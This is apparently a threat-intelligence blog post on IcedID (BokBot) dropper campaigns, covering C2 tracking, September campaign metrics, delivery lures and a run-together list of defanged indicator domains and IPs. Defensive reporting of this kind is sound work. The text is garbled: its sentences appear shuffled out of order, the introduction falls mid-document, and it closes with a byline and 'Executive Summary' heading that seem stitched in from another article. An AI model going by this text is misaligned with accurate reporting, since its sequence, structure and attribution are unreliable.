0	This process includes enrichment with supplementary open source data such as WHOIS information.
0	________________________________________13 SeptemberThere were two campaigns launched; one targeting Italian speakers (project ID 3281798692) and the other targeting English speakers (project ID 726442267).
0	Reconstructing Threat Actor Metrics with Pure Signal ReconIntroductionIcedID (also known as BokBot) started life in early 2017 as a banking trojan that later evolved to include dropper malware capabilities.
0	These capabilities enable IcedID to download and deploy additional malware like Cobalt Strike, with recent infections leading to Quantum ransomware.
0	________________________________________19 SepThe campaign that occurred on 19 September (project ID 775636601) was a bit of an outlier compared to the others weve looked at so far.
0	The IP was reused between domains similarly to the 15 - 16 September campaigns, except in this case the domains were unique.
0	Cybersecurity professionals should continue to pay attention to IcedID as it remains one of the top dropper malware in the threat landscape and has no signs of slowing down.
0	It is typically delivered via email spamming campaigns, with new campaigns being delivered on a near-daily basis that leverage an assortment of different lure types and execution processes.This got us curious - how do different campaigns compare to each other?
0	Weve extensively tracked IcedID C2 infrastructure using our Recon and BARS (Botnet Analysis and Reporting Service) feed tooling, and using this data we were able to peek behind the scenes at metrics that are possibly similar to what the threat actors are tracking themselves.C2 TrackingWeve previously written about IcedID Stage 2 Tier 1 (T1) and Tier 2 (T2) C2 infrastructure and threat telemetry, which pertains to bot activity that occurs after IcedID has successfully infected a machine.
0	In this post, our focus is on the Stage 1 T1 C2s that initially load the malware onto a victims machine after they perform the action being asked of them in the lure, such as enable macros or click a disguised shortcut.
0	________________________________________Bonus Bloopers!
0	We hope that these findings provide benefit to the reader in a number of areas:Context on the cadence, volume, and impact of IcedID campaigns.
0	Data points for the assessment of the effectiveness of IcedID delivery TTPs.
0	Context for the aging out of IcedID C2 IP IOCs;
0	whilst IcedID domains continue to resolve to these IPs, their communications with the T2 cease after approximately 6 days.
0	Topics for security awareness trainings that reflect the current environmentIOCs67.205.169.96aviadronazhed[.]com134.209.97.90qvantumbrakesz[.]com137.184.114.20trallfasterinf[.]comsebdgoldingor[.]com142.93.44.94pildofraften[.]com143.198.178.0audifastinggip[.]com159.203.5.238kolinandod[.]com161.35.110.54alkaliodplus[.]comnikolandfantazy[.]comzalikomanperis[.]com188.166.169.40allozelkot[.]com
0	Make sure your companys security awareness training has adapted too!
0	When it comes to delivery methods, daily campaigns often leverage emails containing password protected zip files and ISOs and perform comparatively well.
0	These metrics are numbers the threat actors are watching as well, and just like any other business may influence their future actions.
0	By Antonio Cocomazzi and Antonio Pirozzi
0	Executive Summary
